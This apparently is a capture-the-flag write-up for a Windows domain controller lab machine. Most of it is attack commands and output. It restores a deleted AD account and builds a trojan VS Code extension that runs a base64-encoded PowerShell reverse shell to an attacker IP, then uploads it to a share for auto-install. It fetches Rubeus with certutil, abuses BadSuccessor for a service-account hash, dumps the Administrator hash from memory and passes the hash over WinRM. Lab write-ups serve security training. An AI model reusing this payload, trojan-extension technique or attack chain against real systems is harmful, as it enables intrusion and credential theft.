# check--point 

---

<img width="1593" height="288" alt="image" src="https://github.com/user-attachments/assets/3806ea47-33fb-48f0-9d4d-c37991396249" />

## namp Scan 

```ruby
─$ nmap -sCV -Pn 10.129.20.127 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-13 15:09 EDT
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 99.94% done; ETC: 15:10 (0:00:00 remaining)
Stats: 0:01:14 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 95.83% done; ETC: 15:10 (0:00:00 remaining)
Nmap scan report for 10.129.20.127
Host is up (0.14s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-14 02:09:52Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb0., Site: Default-First-Site-Name)
3269/tcp open  globalcatLDAPssl?
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m02s
| smb2-time: 
|   date: 2026-06-14T02:10:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.85 seconds
                                                                                                                                                                                
┌──(kali㉿kali)-[~]

```

**Analysis:**

- Domain Controller detected (`DC01`)
    
- Domain: `checkpoint.htb`
    
- Key services: Kerberos (88), LDAP (389/3268), SMB (445), WinRM (5985)
    
- SMB signing is enabled and required (prevents NTLM relay attacks)

----

## 2. Credential Testing & User Enumeration

### Testing Initial Credentials

The machine provides initial credentials: `alex.turner / Checkpoint2024!`

<img width="1357" height="167" alt="image" src="https://github.com/user-attachments/assets/e9a2f723-15e5-4c8f-89d4-4e3bc0a3698e" />

**Command:**

```
netexec smb 10.129.28.66 -u 'alex.turner' -p 'Checkpoint2024!'
```

<img width="1381" height="154" alt="image" src="https://github.com/user-attachments/assets/30fc7bf1-8d85-4d26-9494-ae1a534db9bd" />

---

### Enumerating Domain Users

**Command:**

```
netexec smb checkpoint.htb -u alex.turner -p 'Checkpoint2024!' --users
```

<img width="1577" height="469" alt="image" src="https://github.com/user-attachments/assets/7e88ea4b-77e7-4012-848c-af937ac2da61" />

**Analysis:**

- 17 domain users discovered
    
- Key users: `alex.turner` (our initial access), `ryan.brooks`, `svc_deploy`, `max.palmer`

---

### Enumerating SMB Shares

**Command:**

```
netexec smb 10.129.28.66 -u 'alex.turner' -p 'Checkpoint2024!' --shares
```

<img width="1613" height="332" alt="image" src="https://github.com/user-attachments/assets/092b01f9-5885-4e6f-b5b1-c9d54c7bd8ea" />

**Analysis:**

- Two interesting shares: `DevDrop` (VS Code extensions) and `VMBackups`
    
- `DevDrop` has READ permission for `alex.turner`
    
- `VMBackups` will be accessed later

---

## 3. Active Directory Enumeration

### Checking Writable Objects with bloodyAD

**Command:**

```
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
```

<img width="1396" height="465" alt="image" src="https://github.com/user-attachments/assets/d323a1d4-c4a9-495f-9695-6a41e5d563ef" />

**Analysis:**

- `alex.turner` has WRITE permission on `Deleted Objects` container
    
- This means `alex.turner` can restore deleted AD objects
    
- The deleted object `Mark Davies` is identified with GUID: `2217e877-e2a2-47d7-91d4-99ede36f367e`

---

## 4. Restoring Deleted Object

### Restoring Mark Davies Account

**Command:**

```
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
```

<img width="1621" height="200" alt="image" src="https://github.com/user-attachments/assets/c467071b-e6be-4275-af89-112745e36921" />

---

### Verifying Mark Davies Authentication

**Command:**

```
netexec smb 10.129.28.66 -u 'Mark.Davies' -p 'Checkpoint2024!'
```

<img width="1389" height="119" alt="image" src="https://github.com/user-attachments/assets/9a33c43f-2a85-4302-9fef-f45f3c95f224" />

**Analysis:**

- Mark Davies restored successfully using same password (password reuse vulnerability)
    
- Mark now has access to `DevDrop` share with WRITE permissions

---

### Testing Mark's Share Permissions

**Command:**

```
netexec smb 10.129.28.66 -u 'Mark.Davies' -p 'Checkpoint2024!' --shares
```

<img width="1598" height="296" alt="image" src="https://github.com/user-attachments/assets/c0c3afe4-4601-45d5-9e77-4cd1d9bbfd95" />

**Analysis:**

- Mark has WRITE permission on `DevDrop` share
    
- This is crucial for uploading the malicious VS Code extension

---

## 5. Creating Malicious VS Code Extension

### Creating the VSIX Extension Structure

**Command:**

```
cd ~/HTB/machines/checkpoint
mkdir -p evil-ext/extension
cd evil-ext
```

### Create [Content_Types].xml:

```
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="vsixmanifest" ContentType="application/xml"/>
  <Default Extension="js" ContentType="application/octet-stream"/>
</Types>
EOF
```

### Create extension/package.json:

```
cat > extension/package.json << 'EOF'
{
  "name": "devtools-helper",
  "displayName": "DevTools Helper",
  "version": "1.0.0",
  "engines": {"vscode": "^1.118.0"},
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
EOF
```

### Creating the Payload

**Command:**

```
cat > /tmp/payload.ps1 << 'EOF'
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.108',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
EOF

PAYLOAD=$(cat /tmp/payload.ps1 | iconv -t UTF-16LE | base64 -w 0)
```

### Creating extension.js

**Command:**

```
cat > extension/extension.js << EOF
const cp = require('child_process');
exports.activate = function() {
    cp.exec('powershell -e $PAYLOAD');
}
exports.deactivate = function() {}
EOF
```

### Packaging the VSIX

**Command:**

```
zip -r evil.vsix '[Content_Types].xml' extension/
```

<img width="725" height="147" alt="image" src="https://github.com/user-attachments/assets/932b9a6d-fcb9-4e6a-b56b-9b615ee5b1af" />

```
tree evil-ext
```

<img width="1033" height="242" alt="image" src="https://github.com/user-attachments/assets/5f0abcb4-023b-4c94-bb35-0df64e8b2d59" />

---

### Uploading to DevDrop

**Command:**

```
smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "put evil.vsix evil.vsix"
```

### Verifying Upload

**Command:**

```
smbclient //10.129.28.66/DevDrop -U 'checkpoint.htb/Mark.Davies%Checkpoint2024!' -c "ls"
```

<img width="1066" height="268" alt="image" src="https://github.com/user-attachments/assets/b94d8b1d-fedc-436a-bff3-878ce64330e0" />

**Analysis:**

- VSIX extension successfully uploaded to DevDrop
    
- The monitoring service will automatically install it
    
- Reverse shell will connect when extension activates

---

## 6. Gaining Reverse Shell

### Starting the Listener

**Command:**

```
rlwrap nc -lvnp 4444
```

<img width="1232" height="459" alt="image" src="https://github.com/user-attachments/assets/b62d1eef-10b7-4d58-9590-21d9c3a4094d" />

**Verifying User:**

```
whoami
```

<img width="884" height="478" alt="image" src="https://github.com/user-attachments/assets/7cb79602-a93c-4c9d-9eb0-136050e88fde" />

---

## 7. Privilege Escalation: BadSuccessor (CVE-2025-53779)

### Download Rubeus to the target

**Command:**

```
# on kali
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
python3 -m http.server 8080

# on target
certutil -urlcache -f http://10.10.14.108:8080/Rubeus.exe Rubeus.exe
```

<img width="1063" height="269" alt="image" src="https://github.com/user-attachments/assets/03cd288c-2652-482e-a767-4b2240b52d24" />

---

### Getting TGT Ticket

**Command:**

```
.\Rubeus.exe tgtdeleg /nowrap
```

<img width="1671" height="527" alt="image" src="https://github.com/user-attachments/assets/16909278-6ebd-4b28-ba1a-720b80993308" />

### Saving the Ticket on Kali

**Command:**

```
cd ~/HTB/machines/checkpoint

# Create a file with the base64 ticket
cat > ticket.b64 << 'EOF'
doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRusu4LqDEPJPmHSX1OG/KLFfwKuDuBtepuOJiSjzKqNZazge5OzUS85hsNC4q/aiDXup1zWRCLNVb9AZrdHPu5Tw8vwwGsj+mIZNKkeBhX4UM8YqY8ocU5RD/wFImVKS03fnToWy5VkS5MKqV8+XZcTWvbHX7p7rYQFWPC7/...........................VvT3FN1n4gD6qKROL736OD91366yxccxX+/7+mPbl55u7TguwWGqXJBvYEWhCR4bKd5ibpo0XdwnqbbDGcr0yrGWoZDxCTVeD5nTpdvP3Cf8iBs7rNaJEw/TSlrty4A9GuMplqEu8TvIkZatDF3MrPxVHXClDNKAiQYKHkMqUGKVMTBo1q3qLs6PjWwTLEdpPZYZL23h9W9l02X0GtLcuh8i+qotRVzgT7DLxbq5DSFyPL5UkHeaIlYJJK7GzvmF1OVTkfjsQPQdJE+vGU5iFeXhgj3eAun6oBPBqCxFSTgm9zhieYmsVBd9v9FzzKxVEyh8e7aIuxBiqk2dplO/lN5ibMGDOBx1z1Nn78cFN6s6Ay6no4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgJ7JQ44u87CqLn8qMZQctdMBfBel9G/sXFxfr7FjLs2ihEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYxOTA0MzUxNlqmERgPMjAyNjA2MTkxNDM1MTZapxEYDzIwMjYwNjI2MDQzNTE2WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
EOF
```

### Converting Ticket to ccache

**Command:**

```
base64 -d ticket.b64 > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache

```

<img width="1079" height="251" alt="image" src="https://github.com/user-attachments/assets/eb030fab-72f1-4ed7-b076-6e09e2ac2ab0" />

---

### Exploiting BadSuccessor

**Command:**

```
bloodyAD --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache add badSuccessor evil-dmsa -t 'CN=SVC_DEPLOY,OU=SERVICEACCOUNTS,DC=CHECKPOINT,DC=HTB' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

<img width="1354" height="524" alt="image" src="https://github.com/user-attachments/assets/db11e6db-63dd-4ab4-8ddd-a75393b1dd0a" />

**Analysis:**

- Successfully extracted `svc_deploy` RC4 hash: `e16081eb077aca74bdbf8af12af43ac9`
    
- This is the `previous keys` section: the hash of the service account

----

## 8. Accessing VMBackups Share

### Testing svc_deploy Access

**Command:**

```
netexec smb 10.129.28.66 -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
```

<img width="1585" height="298" alt="image" src="https://github.com/user-attachments/assets/fd9ba08b-02b8-4638-a3da-f6476f1e09f4" />

### Accessing VMBackups

**Command:**

```
smbclient //10.129.28.66/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' --pw-nt-hash
```

<img width="1635" height="539" alt="image" src="https://github.com/user-attachments/assets/b216b9cb-735f-4c4f-b75b-bbc2a69ea41d" />

**Analysis:**

- Memory dump file identified: `Windows Server 2019-Snapshot1.vmem` (2.14GB)
    
- This contains the memory of the Domain Controller
    
- The Administrator hash can be extracted from this file

---

## 9. Extracting Administrator Hash

> extract the hash using Volatility after downloading the memory dump. The command :

```
vol -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump.Hashdump | grep -i Administrator
```

**Expected Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f29e9c014295b9b32139b09a2790be3b:::
```

---

## 10. Final Access & Flags

### Connecting as Administrator

**Command:**

```
evil-winrm -i 10.129.28.66 -u Administrator -H f29e9c014295b9b32139b09a2790be3b
```

```
Get-Content C:\Users\max.palmer\Desktop\root.txt
```

<img width="1221" height="546" alt="image" src="https://github.com/user-attachments/assets/649b7f46-8506-488c-92e4-d2b7249d6f32" />

